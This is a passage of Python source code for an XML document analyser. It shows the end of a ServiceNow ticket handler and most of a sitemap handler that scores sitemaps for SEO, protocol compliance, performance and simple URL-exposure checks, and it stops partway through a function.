            if closed_by and closed_by != resolved_by:
                people['resolvers'].append(closed_by)
        
        # Commenters
        for entry in root.findall('.//sys_journal_field'):
            commenter = self._get_field_value(entry, 'sys_created_by')
            if commenter and commenter not in people['commenters']:
                people['commenters'].append(commenter)
        
        return people
    
    def _extract_custom_fields(self, record: ET.Element) -> Dict[str, str]:
        """Extract custom fields (u_ prefix)"""
        custom_fields = {}
        
        for child in record:
            if child.tag.startswith('u_') and child.text:
                custom_fields[child.tag] = child.text.strip()
        
        return custom_fields
    
    def _get_field_value(self, element: Optional[ET.Element], field_name: str) -> Optional[str]:
        """Get text value of a field"""
        if element is None:
            return None
        field = element.find(f'.//{field_name}')
        if field is not None and field.text:
            return field.text.strip()
        return None
    
    def _get_field_display_value(self, element: Optional[ET.Element], field_name: str) -> Optional[str]:
        """Get display_value attribute of a field"""
        if element is None:
            return None
        field = element.find(f'.//{field_name}')
        if field is not None:
            return field.get('display_value', field.text)
        return None
    
    def _calculate_resolution_time(self, record: ET.Element) -> Optional[str]:
        """Calculate time to resolution"""
        opened = self._get_field_value(record, 'opened_at')
        resolved = self._get_field_value(record, 'resolved_at')
        
        if opened and resolved:
            try:
                opened_dt = datetime.fromisoformat(opened.replace(' ', 'T'))
                resolved_dt = datetime.fromisoformat(resolved.replace(' ', 'T'))
                duration = resolved_dt - opened_dt
                return str(duration)
            except:
                pass
        
        return None
    
    def _count_unique_contributors(self, entries: List[ET.Element]) -> int:
        """Count unique contributors to journal entries"""
        contributors = set()
        for entry in entries:
            created_by = self._get_field_value(entry, 'sys_created_by')
            if created_by:
                contributors.add(created_by)
        return len(contributors)
    
    def _calculate_conversation_duration(self, entries: List[ET.Element]) -> Optional[str]:
        """Calculate duration of conversation"""
        timestamps = []
        for entry in entries:
            timestamp = self._get_field_value(entry, 'sys_created_on')
            if timestamp:
                timestamps.append(timestamp)
        
        if len(timestamps) >= 2:
            timestamps.sort()
            try:
                first = datetime.fromisoformat(timestamps[0].replace(' ', 'T'))
                last = datetime.fromisoformat(timestamps[-1].replace(' ', 'T'))
                duration = last - first
                return str(duration)
            except:
                pass
        
        return None
    
    def _analyze_state_transitions(self, record: ET.Element, root: ET.Element) -> List[str]:
        """Analyze state transitions from journal entries"""
        # This would require parsing work notes for state changes
        # For now, return basic transition
        state = self._get_field_value(record, 'state')
        state_text = self._get_field_value(record, 'u_state_text')
        
        transitions = []
        if state_text:
            transitions.append(f"Final state: {state_text}")
        
        return transitions
    
    def _create_data_inventory(self, root: ET.Element) -> Dict[str, int]:
        """Create inventory of data types found"""
        inventory = {
            'incidents': len(root.findall('.//incident')),
            'problems': len(root.findall('.//problem')),
            'changes': len(root.findall('.//change')),
            'journal_entries': len(root.findall('.//sys_journal_field')),
            'attachments': len(root.findall('.//sys_attachment')),
            'total_fields': 0
        }
        
        # Count fields in primary record
        primary = self._get_primary_record(root)
        if primary:
            inventory['total_fields'] = len(list(primary))
        
        return inventory
    
    def _generate_recommendations(self, findings: Dict[str, Any]) -> List[str]:
        """Generate recommendations based on analysis"""
        recommendations = []
        
        # SLA recommendations
        if 'sla_metrics' in findings and findings['sla_metrics'].get('made_sla') is False:
            recommendations.append("Analyze SLA breach patterns to improve service delivery")
        
        # Workflow recommendations
        workflow = findings.get('workflow_analysis', {})
        if workflow.get('reassignment_count') and int(workflow['reassignment_count']) > 3:
            recommendations.append("High reassignment count - review assignment rules and skills mapping")
        
        if workflow.get('reopen_count') and int(workflow['reopen_count']) > 0:
            recommendations.append("Ticket was reopened - analyze root cause to prevent recurrence")
        
        # Journal recommendations
        journal = findings.get('journal_analysis', {})
        if journal.get('work_notes_count', 0) > journal.get('comments_count', 0) * 2:
            recommendations.append("High internal communication - consider improving customer updates")
        
        # General recommendations
        recommendations.extend([
            "Extract conversation patterns for chatbot training",
            "Analyze resolution patterns for knowledge base creation",
            "Mine ticket data for predictive incident prevention"
        ])
        
        return recommendations
    
    def _identify_ai_use_cases(self, findings: Dict[str, Any]) -> List[str]:
        """Identify AI/ML use cases based on the data"""
        use_cases = [
            "Automated ticket categorization and routing",
            "SLA breach prediction and prevention",
            "Similar incident detection and solution recommendation",
            "Sentiment analysis on customer communications",
            "Workload prediction and resource optimization",
            "Knowledge extraction from resolution notes",
            "Automated response generation for common issues",
            "Assignment recommendation based on skills and availability",
            "Problem pattern detection across incidents",
            "Predictive maintenance from incident trends"
        ]
        
        # Add specific use cases based on findings
        if findings.get('attachment_analysis', {}).get('total_attachments', 0) > 0:
            use_cases.append("Image analysis for screenshot error detection")
        
        if findings.get('journal_analysis', {}).get('total_entries', 0) > 10:
            use_cases.append("Conversation summarization for handoffs")
        
        return use_cases
    
    def _calculate_quality_metrics(self, root: ET.Element) -> Dict[str, float]:
        """Calculate data quality metrics"""
        primary = self._get_primary_record(root)
        
        if not primary:
            return {"completeness": 0.0, "consistency": 0.0, "richness": 0.0}
        
        # Completeness - check key fields
        key_fields = ['number', 'short_description', 'opened_at', 'state', 'priority', 'assigned_to']
        filled_fields = sum(1 for field in key_fields if self._get_field_value(primary, field))
        completeness = filled_fields / len(key_fields)
        
        # Consistency - check data formats
        consistency_score = 1.0
        # Check date formats
        date_fields = ['opened_at', 'closed_at', 'resolved_at', 'sys_created_on']
        for field in date_fields:
            value = self._get_field_value(primary, field)
            if value and not re.match(r'\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}', value):
                consistency_score -= 0.1
        
        # Richness - amount of supplementary data
        journal_count = len(root.findall('.//sys_journal_field'))
        attachment_count = len(root.findall('.//sys_attachment'))
        custom_fields = len([f for f in primary if f.tag.startswith('u_')])
        
        richness = min(1.0, (journal_count * 0.1 + attachment_count * 0.05 + custom_fields * 0.02))
        
        return {
            "completeness": completeness,
            "consistency": max(0.0, consistency_score),
            "richness": richness
        }
</file>

<file path="src/handlers/sitemap_handler.py">
#!/usr/bin/env python3
"""
Sitemap Handler

Analyzes XML sitemap files for SEO optimization, URL structure analysis,
content indexing patterns, and website health monitoring.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import sys
import os
from urllib.parse import urlparse

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class SitemapHandler(XMLHandler):
    """Handler for XML sitemap files"""
    
    SITEMAP_NAMESPACE = "http://www.sitemaps.org/schemas/sitemap/0.9"
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check for sitemap namespace
        if 'sitemaps.org/schemas/sitemap' in str(namespaces.values()):
            return True, 1.0
        
        # Check for urlset or sitemapindex root
        tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        if tag in ['urlset', 'sitemapindex']:
            return True, 0.8
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        is_index = tag == 'sitemapindex'
        
        metadata = {
            "standard": "Sitemaps.org Protocol",
            "category": "seo_indexing",
            "sitemap_type": "index" if is_index else "urlset",
            "namespace_uri": self.SITEMAP_NAMESPACE,
            "element_count": len(list(root.iter()))
        }
        
        return DocumentTypeInfo(
            type_name="XML Sitemap" + (" Index" if is_index else ""),
            confidence=1.0,
            version="0.9",
            schema_uri=self.SITEMAP_NAMESPACE,
            metadata=metadata
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        is_index = tag == 'sitemapindex'
        
        findings = {
            'sitemap_info': {
                'type': 'index' if is_index else 'urlset',
                'namespace': self._extract_namespace_info(root),
                'file_path': file_path
            },
            'content_analysis': self._analyze_sitemap_index(root) if is_index else self._analyze_url_sitemap(root),
            'seo_analysis': self._analyze_seo_aspects(root, is_index),
            'technical_analysis': self._analyze_technical_aspects(root, is_index),
            'quality_indicators': self._analyze_quality_indicators(root, is_index),
            'accessibility_analysis': self._analyze_accessibility(root, is_index),
            'performance_analysis': self._analyze_performance_aspects(root, is_index),
            'compliance_analysis': self._analyze_compliance(root, is_index),
            'security_analysis': self._analyze_security_aspects(root),
            'optimization_opportunities': self._identify_optimization_opportunities(root, is_index)
        }
        
        recommendations = [
            "Validate all URLs for accessibility and response codes",
            "Check for outdated or broken links regularly",
            "Analyze URL patterns for SEO optimization opportunities",
            "Monitor change frequencies against actual content updates",
            "Ensure proper priority distribution across content types",
            "Validate sitemap size limits (50,000 URLs max)",
            "Review last modification dates for accuracy",
            "Optimize sitemap structure for search engine crawling",
            "Implement sitemap index for large sites (>50,000 URLs)"
        ]
        
        ai_use_cases = [
            "SEO health monitoring and optimization",
            "Content update pattern analysis and prediction",
            "Website structure visualization and mapping",
            "Broken link detection and automated fixing",
            "Content priority optimization based on analytics",
            "Crawl budget optimization analysis",
            "Duplicate content detection across URL patterns",
            "Sitemap performance monitoring and alerting",
            "Automated sitemap generation and maintenance",
            "SEO competitive analysis and benchmarking"
        ]
        
        # Calculate data inventory
        if is_index:
            data_inventory = {
                'sitemaps': findings['content_analysis'].get('sitemap_count', 0),
                'total_elements': len(list(root.iter())),
                'last_modified_entries': len([s for s in findings['content_analysis'].get('sitemap_details', []) if s.get('lastmod')])
            }
        else:
            data_inventory = {
                'urls': findings['content_analysis'].get('url_count', 0),
                'priority_entries': sum(findings['content_analysis'].get('priorities', {}).values()),
                'changefreq_entries': sum(findings['content_analysis'].get('change_frequencies', {}).values()),
                'lastmod_entries': findings['content_analysis'].get('last_modified', {}).get('count', 0),
                'unique_domains': len(findings['content_analysis'].get('url_patterns', {}).get('domains', []))
            }
        
        return SpecializedAnalysis(
            document_type=f"XML Sitemap {'Index' if is_index else 'URLset'}",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory=data_inventory,
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_sitemap_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        is_index = tag == 'sitemapindex'
        
        return {
            'sitemap_metadata': {
                'type': 'index' if is_index else 'urlset',
                'namespace': self.SITEMAP_NAMESPACE,
                'total_entries': len(root.findall(f'.//{{{self.SITEMAP_NAMESPACE}}}{"sitemap" if is_index else "url"}'))
            },
            'content_summary': self._extract_content_summary(root, is_index),
            'seo_summary': self._extract_seo_summary(root, is_index),
            'technical_summary': self._extract_technical_summary(root, is_index)
        }
    
    def _extract_namespace_info(self, root: ET.Element) -> Dict[str, Any]:
        """Extract namespace information"""
        namespaces = {}
        for key, value in root.attrib.items():
            if key.startswith('xmlns'):
                prefix = key.split(':', 1)[1] if ':' in key else 'default'
                namespaces[prefix] = value
        
        return {
            'declared_namespaces': namespaces,
            'sitemap_namespace': self.SITEMAP_NAMESPACE in str(namespaces.values()),
            'schema_version': '0.9'  # Standard sitemap version
        }
    
    def _analyze_url_sitemap(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze URL sitemap content"""
        urls = root.findall(f'.//{{{self.SITEMAP_NAMESPACE}}}url')
        
        findings = {
            'url_count': len(urls),
            'url_details': self._extract_url_details(urls[:1000]),  # First 1000 for performance
            'priorities': self._analyze_priorities(urls),
            'change_frequencies': self._analyze_changefreqs(urls),
            'last_modified': self._analyze_lastmod(urls),
            'url_patterns': self._analyze_url_patterns(urls),
            'size_analysis': self._analyze_sitemap_size(root, urls)
        }
        
        return findings
    
    def _analyze_sitemap_index(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze sitemap index content"""
        sitemaps = root.findall(f'.//{{{self.SITEMAP_NAMESPACE}}}sitemap')
        
        findings = {
            'sitemap_count': len(sitemaps),
            'sitemap_details': self._extract_sitemap_details(sitemaps),
            'last_modified': self._analyze_sitemap_dates(sitemaps),
            'size_distribution': self._analyze_index_size_distribution(sitemaps)
        }
        
        return findings
    
    def _analyze_seo_aspects(self, root: ET.Element, is_index: bool) -> Dict[str, Any]:
        """Analyze SEO-related aspects"""
        seo_analysis = {
            'priority_distribution': {},
            'changefreq_distribution': {},
            'content_freshness': {},
            'url_structure_seo': {},
            'crawl_optimization': {}
        }
        
        if not is_index:
            urls = root.findall(f'.//{{{self.SITEMAP_NAMESPACE}}}url')
            
            # Priority distribution analysis
            priorities = self._analyze_priorities(urls)
            total_urls = len(urls)
            seo_analysis['priority_distribution'] = {
                'distribution': priorities,
                'average_priority': self._calculate_average_priority(urls),
                'high_priority_count': sum(v for k, v in priorities.items() if float(k) >= 0.8),
                'low_priority_count': sum(v for k, v in priorities.items() if float(k) <= 0.3)
            }
            
            # Change frequency analysis
            changefreqs = self._analyze_changefreqs(urls)
            seo_analysis['changefreq_distribution'] = {
                'distribution': changefreqs,
                'most_common': max(changefreqs.items(), key=lambda x: x[1])[0] if changefreqs else None,
                'update_pattern_consistency': self._analyze_update_patterns(urls)
            }
            
            # Content freshness analysis
            lastmod_data = self._analyze_lastmod(urls)
            seo_analysis['content_freshness'] = {
                'urls_with_lastmod': lastmod_data.get('count', 0),
                'freshness_percentage': (lastmod_data.get('count', 0) / total_urls * 100) if total_urls > 0 else 0,
                'date_range': {
                    'oldest': lastmod_data.get('oldest'),
                    'newest': lastmod_data.get('latest')
                }
            }
            
            # URL structure SEO analysis
            url_patterns = self._analyze_url_patterns(urls)
            seo_analysis['url_structure_seo'] = {
                'domain_consistency': len(url_patterns.get('domains', [])) == 1,
                'depth_distribution': url_patterns.get('depth_levels', {}),
                'seo_friendly_structure': self._assess_url_seo_friendliness(urls)
            }
        
        return seo_analysis
    
    def _analyze_technical_aspects(self, root: ET.Element, is_index: bool) -> Dict[str, Any]:
        """Analyze technical aspects of the sitemap"""
        technical = {
            'file_size': self._estimate_file_size(root),
            'compression_recommended': False,
            'namespace_compliance': True,
            'schema_validation': {},
            'encoding_analysis': {}
        }
        
        # Check if compression is recommended (>10KB estimated size)
        technical['compression_recommended'] = technical['file_size'] > 10000
        
        # Validate namespace usage
        technical['namespace_compliance'] = self._validate_namespace_usage(root)
        
        # Schema validation
        technical['schema_validation'] = self._validate_schema_compliance(root, is_index)
        
        return technical
    
    def _analyze_quality_indicators(self, root: ET.Element, is_index: bool) -> Dict[str, Any]:
        """Analyze quality indicators"""
        quality = {
            'completeness_score': 0.0,
            'consistency_score': 0.0,
            'best_practices_score': 0.0,
            'recommendations': []
        }
        
        if not is_index:
            urls = root.findall(f'.//{{{self.SITEMAP_NAMESPACE}}}url')
            total_urls = len(urls)
            
            if total_urls > 0:
                # Completeness score
                urls_with_priority = sum(1 for url in urls if url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}priority') is not None)
                urls_with_changefreq = sum(1 for url in urls if url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}changefreq') is not None)
                urls_with_lastmod = sum(1 for url in urls if url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}lastmod') is not None)
                
                quality['completeness_score'] = (
                    (urls_with_priority / total_urls * 0.3) +
                    (urls_with_changefreq / total_urls * 0.3) +
                    (urls_with_lastmod / total_urls * 0.4)
                )
                
                # Consistency score
                quality['consistency_score'] = self._calculate_consistency_score(urls)
                
                # Best practices score
                quality['best_practices_score'] = self._calculate_best_practices_score(urls, total_urls)
        
        # Generate recommendations
        if quality['completeness_score'] < 0.7:
            quality['recommendations'].append('Add missing lastmod, priority, or changefreq elements')
        if quality['consistency_score'] < 0.8:
            quality['recommendations'].append('Improve consistency in priority and changefreq values')
        
        return quality
    
    def _analyze_accessibility(self, root: ET.Element, is_index: bool) -> Dict[str, Any]:
        """Analyze accessibility of URLs in sitemap"""
        accessibility = {
            'protocol_analysis': {},
            'url_validity': {},
            'potential_issues': []
        }
        
        if not is_index:
            urls = root.findall(f'.//{{{self.SITEMAP_NAMESPACE}}}url')
            
            # Protocol analysis
            protocols = {}
            for url in urls[:1000]:  # Analyze first 1000
                loc_elem = url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}loc')
                if loc_elem is not None and loc_elem.text:
                    protocol = urlparse(loc_elem.text).scheme
                    protocols[protocol] = protocols.get(protocol, 0) + 1
            
            accessibility['protocol_analysis'] = {
                'protocols_used': protocols,
                'https_percentage': (protocols.get('https', 0) / sum(protocols.values()) * 100) if protocols else 0,
                'mixed_protocols': len(protocols) > 1
            }
            
            # URL validity checks
            accessibility['url_validity'] = self._check_url_validity(urls[:100])  # Check first 100
            
            # Identify potential issues
            if protocols.get('http', 0) > 0:
                accessibility['potential_issues'].append('Contains non-HTTPS URLs')
            if accessibility['url_validity']['invalid_urls'] > 0:
                accessibility['potential_issues'].append('Contains potentially invalid URLs')
        
        return accessibility
    
    def _analyze_performance_aspects(self, root: ET.Element, is_index: bool) -> Dict[str, Any]:
        """Analyze performance-related aspects"""
        performance = {
            'size_optimization': {},
            'crawl_efficiency': {},
            'recommendations': []
        }
        
        total_elements = len(list(root.iter()))
        
        # Size optimization
        performance['size_optimization'] = {
            'total_elements': total_elements,
            'estimated_size': self._estimate_file_size(root),
            'compression_savings': self._estimate_compression_savings(root),
            'size_limit_compliance': total_elements <= 50000  # Standard sitemap limit
        }
        
        if not is_index:
            urls = root.findall(f'.//{{{self.SITEMAP_NAMESPACE}}}url')
            
            # Crawl efficiency
            performance['crawl_efficiency'] = {
                'url_density': len(urls) / total_elements,
                'priority_optimization': self._analyze_priority_optimization(urls),
                'changefreq_accuracy': self._analyze_changefreq_accuracy(urls)
            }
        
        # Generate recommendations
        if not performance['size_optimization']['size_limit_compliance']:
            performance['recommendations'].append('Split sitemap - exceeds 50,000 URL limit')
        if performance['size_optimization']['estimated_size'] > 50 * 1024 * 1024:  # 50MB
            performance['recommendations'].append('Sitemap file size exceeds 50MB limit')
        
        return performance
    
    def _analyze_compliance(self, root: ET.Element, is_index: bool) -> Dict[str, Any]:
        """Analyze compliance with sitemap protocol"""
        compliance = {
            'protocol_version': '0.9',
            'namespace_compliance': True,
            'required_elements': {},
            'optional_elements': {},
            'violations': []
        }
        
        # Check namespace compliance
        compliance['namespace_compliance'] = self._validate_namespace_usage(root)
        
        if not is_index:
            urls = root.findall(f'.//{{{self.SITEMAP_NAMESPACE}}}url')
            
            # Check required elements
            urls_with_loc = sum(1 for url in urls if url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}loc') is not None)
            compliance['required_elements'] = {
                'loc_present': urls_with_loc,
                'loc_compliance': urls_with_loc == len(urls)
            }
            
            # Check optional elements
            compliance['optional_elements'] = {
                'lastmod_usage': sum(1 for url in urls if url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}lastmod') is not None),
                'changefreq_usage': sum(1 for url in urls if url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}changefreq') is not None),
                'priority_usage': sum(1 for url in urls if url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}priority') is not None)
            }
            
            # Check for violations
            if not compliance['required_elements']['loc_compliance']:
                compliance['violations'].append('Some URLs missing required <loc> element')
        
        return compliance
    
    def _analyze_security_aspects(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze security aspects"""
        security = {
            'exposed_information': [],
            'url_security': {},
            'recommendations': []
        }
        
        # Check for potentially sensitive information in URLs
        urls = root.findall(f'.//{{{self.SITEMAP_NAMESPACE}}}url')
        for url in urls[:100]:  # Check first 100
            loc_elem = url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}loc')
            if loc_elem is not None and loc_elem.text:
                url_text = loc_elem.text.lower()
                if any(pattern in url_text for pattern in ['admin', 'private', 'test', 'staging', 'dev']):
                    security['exposed_information'].append('Potentially sensitive URLs detected')
                    break
        
        # URL security analysis
        security['url_security'] = {
            'https_usage': self._count_https_urls(urls),
            'total_urls': len(urls)
        }
        
        # Generate recommendations
        if security['exposed_information']:
            security['recommendations'].append('Review URLs for sensitive information exposure')
        
        https_percentage = (security['url_security']['https_usage'] / 
                          security['url_security']['total_urls'] * 100) if security['url_security']['total_urls'] > 0 else 0
        if https_percentage < 100:
            security['recommendations'].append('Consider migrating all URLs to HTTPS')
        
        return security
    
    def _identify_optimization_opportunities(self, root: ET.Element, is_index: bool) -> Dict[str, Any]:
        """Identify optimization opportunities"""
        opportunities = {
            'seo_opportunities': [],
            'technical_opportunities': [],
            'maintenance_opportunities': []
        }
        
        if not is_index:
            urls = root.findall(f'.//{{{self.SITEMAP_NAMESPACE}}}url')
            total_urls = len(urls)
            
            # SEO opportunities
            priorities = self._analyze_priorities(urls)
            if not priorities:
                opportunities['seo_opportunities'].append('Add priority values to guide search engine crawling')
            
            changefreqs = self._analyze_changefreqs(urls)
            if not changefreqs:
                opportunities['seo_opportunities'].append('Add changefreq values to optimize crawl frequency')
            
            lastmod_data = self._analyze_lastmod(urls)
            if lastmod_data.get('count', 0) < total_urls * 0.5:
                opportunities['seo_opportunities'].append('Add lastmod dates to improve crawl efficiency')
            
            # Technical opportunities
            if total_urls > 10000:
                opportunities['technical_opportunities'].append('Consider splitting into multiple sitemaps for better performance')
            
            # Maintenance opportunities
            if lastmod_data.get('count', 0) > 0:
                opportunities['maintenance_opportunities'].append('Implement automated lastmod date updates')
        
        return opportunities
    
    def _extract_url_details(self, urls: List[ET.Element]) -> List[Dict[str, Any]]:
        """Extract detailed information for URLs"""
        url_details = []
        
        for url in urls:
            url_data = {}
            
            loc = url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}loc')
            if loc is not None and loc.text:
                url_data['loc'] = loc.text
                
                # Parse URL components
                parsed = urlparse(loc.text)
                url_data['domain'] = parsed.netloc
                url_data['path'] = parsed.path
                url_data['scheme'] = parsed.scheme
                url_data['depth'] = len([p for p in parsed.path.split('/') if p])
            
            lastmod = url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}lastmod')
            if lastmod is not None and lastmod.text:
                url_data['lastmod'] = lastmod.text
            
            changefreq = url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}changefreq')
            if changefreq is not None and changefreq.text:
                url_data['changefreq'] = changefreq.text
            
            priority = url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}priority')
            if priority is not None and priority.text:
                url_data['priority'] = float(priority.text)
            
            url_details.append(url_data)
        
        return url_details
    
    def _extract_sitemap_details(self, sitemaps: List[ET.Element]) -> List[Dict[str, Any]]:
        """Extract detailed information for sitemaps in index"""
        sitemap_details = []
        
        for sitemap in sitemaps:
            sitemap_data = {}
            
            loc = sitemap.find(f'.//{{{self.SITEMAP_NAMESPACE}}}loc')
            if loc is not None and loc.text:
                sitemap_data['loc'] = loc.text
            
            lastmod = sitemap.find(f'.//{{{self.SITEMAP_NAMESPACE}}}lastmod')
            if lastmod is not None and lastmod.text:
                sitemap_data['lastmod'] = lastmod.text
            
            sitemap_details.append(sitemap_data)
        
        return sitemap_details
    
    def _analyze_priorities(self, urls: List[ET.Element]) -> Dict[str, int]:
        """Analyze priority distribution"""
        priorities = {}
        
        for url in urls:
            priority = url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}priority')
            if priority is not None and priority.text:
                p_value = priority.text
                priorities[p_value] = priorities.get(p_value, 0) + 1
        
        return priorities
    
    def _analyze_changefreqs(self, urls: List[ET.Element]) -> Dict[str, int]:
        """Analyze change frequency distribution"""
        frequencies = {}
        
        for url in urls:
            changefreq = url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}changefreq')
            if changefreq is not None and changefreq.text:
                freq = changefreq.text
                frequencies[freq] = frequencies.get(freq, 0) + 1
        
        return frequencies
    
    def _analyze_lastmod(self, urls: List[ET.Element]) -> Dict[str, Any]:
        """Analyze last modification dates"""
        dates = []
        
        for url in urls:
            lastmod = url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}lastmod')
            if lastmod is not None and lastmod.text:
                dates.append(lastmod.text)
        
        if dates:
            return {
                'count': len(dates),
                'latest': max(dates),
                'oldest': min(dates),
                'coverage_percentage': len(dates) / len(urls) * 100
            }
        
        return {'count': 0}
    
    def _analyze_url_patterns(self, urls: List[ET.Element]) -> Dict[str, Any]:
        """Analyze URL patterns and structure"""
        patterns = {
            'domains': set(),
            'extensions': {},
            'depth_levels': {},
            'path_patterns': {}
        }
        
        for url in urls[:1000]:  # Analyze first 1000 URLs for performance
            loc = url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}loc')
            if loc is not None and loc.text:
                parsed = urlparse(loc.text)
                
                # Extract domain
                patterns['domains'].add(parsed.netloc)
                
                # Count depth
                path_parts = [p for p in parsed.path.split('/') if p]
                depth = len(path_parts)
                patterns['depth_levels'][depth] = patterns['depth_levels'].get(depth, 0) + 1
                
                # Analyze extensions
                if '.' in parsed.path:
                    ext = parsed.path.split('.')[-1].lower()
                    if len(ext) <= 4:  # Reasonable extension length
                        patterns['extensions'][ext] = patterns['extensions'].get(ext, 0) + 1
                
                # Analyze path patterns
                if path_parts:
                    first_segment = path_parts[0]
                    patterns['path_patterns'][first_segment] = patterns['path_patterns'].get(first_segment, 0) + 1
        
        patterns['domains'] = list(patterns['domains'])
        return patterns
    
    def _analyze_sitemap_dates(self, sitemaps: List[ET.Element]) -> Dict[str, Any]:
        """Analyze sitemap modification dates"""
        dates = []
        
        for sitemap in sitemaps:
            lastmod = sitemap.find(f'.//{{{self.SITEMAP_NAMESPACE}}}lastmod')
            if lastmod is not None and lastmod.text:
                dates.append(lastmod.text)
        
        if dates:
            return {
                'count': len(dates),
                'latest': max(dates),
                'oldest': min(dates)
            }
        
        return {'count': 0}
    
    def _analyze_sitemap_size(self, root: ET.Element, urls: List[ET.Element]) -> Dict[str, Any]:
        """Analyze sitemap size characteristics"""
        return {
            'url_count': len(urls),
            'total_elements': len(list(root.iter())),
            'estimated_file_size': self._estimate_file_size(root),
            'size_limit_compliance': len(urls) <= 50000,
            'compression_recommended': self._estimate_file_size(root) > 10000
        }
    
    def _analyze_index_size_distribution(self, sitemaps: List[ET.Element]) -> Dict[str, Any]:
        """Analyze size distribution in sitemap index"""
        return {
            'sitemap_count': len(sitemaps),
            'estimated_total_size': len(sitemaps) * 1000,  # Rough estimate
            'index_efficiency': min(len(sitemaps) / 1000, 1.0)  # Efficiency score
        }
    
    def _calculate_average_priority(self, urls: List[ET.Element]) -> float:
        """Calculate average priority value"""
        priorities = []
        for url in urls:
            priority = url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}priority')
            if priority is not None and priority.text:
                try:
                    priorities.append(float(priority.text))
                except ValueError:
                    continue
        
        return sum(priorities) / len(priorities) if priorities else 0.5
    
    def _analyze_update_patterns(self, urls: List[ET.Element]) -> float:
        """Analyze consistency of update patterns"""
        # Simplified consistency score based on changefreq distribution
        changefreqs = self._analyze_changefreqs(urls)
        if not changefreqs:
            return 0.0
        
        total = sum(changefreqs.values())
        # More consistent if fewer different frequencies are used
        return 1.0 - (len(changefreqs) - 1) / 6  # 6 is max reasonable changefreq types
    
    def _assess_url_seo_friendliness(self, urls: List[ET.Element]) -> Dict[str, Any]:
        """Assess SEO friendliness of URL structure"""
        seo_analysis = {
            'readable_urls': 0,
            'short_urls': 0,
            'parameterized_urls': 0,
            'total_analyzed': 0
        }
        
        for url in urls[:100]:  # Analyze first 100
            loc = url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}loc')
            if loc is not None and loc.text:
                url_text = loc.text
                seo_analysis['total_analyzed'] += 1
                
                # Check if URL is readable (no excessive parameters)
                if '?' not in url_text or url_text.count('&') <= 2:
                    seo_analysis['readable_urls'] += 1
                
                # Check URL length
                if len(url_text) <= 100:
                    seo_analysis['short_urls'] += 1
                
                # Count parameterized URLs
                if '?' in url_text:
                    seo_analysis['parameterized_urls'] += 1
        
        return seo_analysis
    
    def _estimate_file_size(self, root: ET.Element) -> int:
        """Estimate file size in bytes"""
        # Rough estimation based on element count and average element size
        element_count = len(list(root.iter()))
        return element_count * 150  # Average 150 bytes per element
    
    def _validate_namespace_usage(self, root: ET.Element) -> bool:
        """Validate proper namespace usage"""
        return self.SITEMAP_NAMESPACE in root.tag or 'xmlns' in root.attrib
    
    def _validate_schema_compliance(self, root: ET.Element, is_index: bool) -> Dict[str, Any]:
        """Validate schema compliance"""
        compliance = {
            'required_elements_present': True,
            'valid_element_structure': True,
            'namespace_correct': self._validate_namespace_usage(root)
        }
        
        expected_child = 'sitemap' if is_index else 'url'
        children = root.findall(f'.//{{{self.SITEMAP_NAMESPACE}}}{expected_child}')
        
        compliance['required_elements_present'] = len(children) > 0
        
        return compliance
    
    def _estimate_compression_savings(self, root: ET.Element) -> Dict[str, Any]:
        """Estimate compression savings"""
        estimated_size = self._estimate_file_size(root)
        return {
            'uncompressed_size': estimated_size,
            'estimated_compressed_size': int(estimated_size * 0.1),  # XML compresses well
            'estimated_savings': int(estimated_size * 0.9)
        }
    
    def _analyze_priority_optimization(self, urls: List[ET.Element]) -> Dict[str, Any]:
        """Analyze priority optimization"""
        priorities = self._analyze_priorities(urls)
        return {
            'distribution': priorities,
            'optimization_score': len(priorities) / 11 if priorities else 0,  # 0.0-1.0 range
            'needs_optimization': len(set(priorities.keys())) <= 2
        }
    
    def _analyze_changefreq_accuracy(self, urls: List[ET.Element]) -> Dict[str, Any]:
        """Analyze changefreq accuracy"""
        changefreqs = self._analyze_changefreqs(urls)
        return {
            'distribution': changefreqs,
            'diversity_score': min(len(changefreqs) / 6, 1.0),  # Max 6 standard frequencies
            'most_common': max(changefreqs.items(), key=lambda x: x[1])[0] if changefreqs else None
        }
    
    def _calculate_consistency_score(self, urls: List[ET.Element]) -> float:
        """Calculate consistency score"""
        # Check consistency of priority values and changefreq values
        priorities = self._analyze_priorities(urls)
        changefreqs = self._analyze_changefreqs(urls)
        
        # Simple consistency score based on distribution
        priority_consistency = 1.0 - (len(priorities) - 1) / 10 if priorities else 0.5
